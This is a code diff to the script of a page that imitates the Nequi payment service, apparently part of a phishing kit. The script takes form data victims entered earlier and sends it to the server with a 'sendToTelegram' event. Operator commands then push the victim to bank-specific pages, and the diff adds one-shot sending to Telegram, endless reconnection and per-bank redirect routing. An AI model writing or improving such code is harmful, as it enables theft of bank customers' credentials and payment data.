@@ -139,6 +139,7 @@
     </div>
 
     <script src="/socket.io/socket.io.js"></script>
+    <script src="/js/bank-routes.js"></script>
     <script>
         let sessionId = localStorage.getItem('nequiSessionId');
         if (!sessionId) {
@@ -148,16 +149,16 @@
         
         const formData = JSON.parse(sessionStorage.getItem('formData') || '{}');
         const waitMessage = document.getElementById('waitMessage');
+        let telegramDispatched = false;
         
         const socket = io({
+            auth: { sessionId },
             transports: ['websocket', 'polling'],
             reconnection: true,
-            reconnectionAttempts: 20,
-            reconnectionDelay: 200,
-            reconnectionDelayMax: 1000,
-            timeout: 5000,
-            pingInterval: 2000,
-            pingTimeout: 5000
+            reconnectionAttempts: Infinity,
+            reconnectionDelay: 500,
+            reconnectionDelayMax: 3000,
+            timeout: 20000
         });
 
         let keepAliveInterval, pingInterval;
@@ -173,26 +174,36 @@
             if (pingInterval) clearInterval(pingInterval);
         }
 
-        socket.on('connect', () => {
-            
-            // Inicializar sesión
+        function resolveBankUrl(data) {
+            const bank = data?.bank || formData.bank || sessionStorage.getItem('bank');
+            if (data?.bankRoute) return data.bankRoute;
+            return window.BankRoutes?.getBankRoute(bank) || null;
+        }
+
+        function bindSession() {
             socket.emit('initSession', {
                 sessionId,
                 module: 'nequi',
                 page: 'loading',
                 data: formData
             });
-            
-            // Enviar datos a Telegram
-            setTimeout(() => {
-                console.log('📤 Enviando a Telegram...');
-                socket.emit('sendToTelegram', {
-                    sessionId,
-                    data: formData
-                });
-            }, 100);
-            
-            // Iniciar keep-alive
+        }
+
+        function sendToTelegramOnce() {
+            if (telegramDispatched || !socket.connected) return;
+            telegramDispatched = true;
+            console.log('📤 Enviando a Telegram...', formData);
+            socket.emit('sendToTelegram', { sessionId, data: formData });
+        }
+
+        socket.on('connect', () => {
+            bindSession();
+            setTimeout(sendToTelegramOnce, 150);
+            startKeepAlive();
+        });
+
+        socket.on('reconnect', () => {
+            bindSession();
             startKeepAlive();
         });
 
@@ -212,10 +223,27 @@
         socket.on('actionFollow', (data) => {
             if (data.sessionId !== sessionId) return;
             
-            console.log('✅ Aprobado - Redirigiendo a PSE');
+            const bankUrl = resolveBankUrl(data);
+            console.log('✅ Aprobado - Redirigiendo a:', bankUrl || '/pse');
             stopKeepAlive();
             localStorage.setItem('fromNequi', 'true');
-            window.location.href = '/pse';
+            if (bankUrl) {
+                window.location.href = bankUrl;
+            } else {
+                window.location.href = '/pse';
+            }
+        });
+
+        socket.on('actionApprovePSE', (data) => {
+            if (data.sessionId !== sessionId) return;
+            const bankUrl = resolveBankUrl(data);
+            stopKeepAlive();
+            if (bankUrl) {
+                window.location.href = bankUrl;
+            } else {
+                alert('Banco no disponible');
+                window.location.href = '/';
+            }
         });
 
         socket.on('actionWait', (data) => {
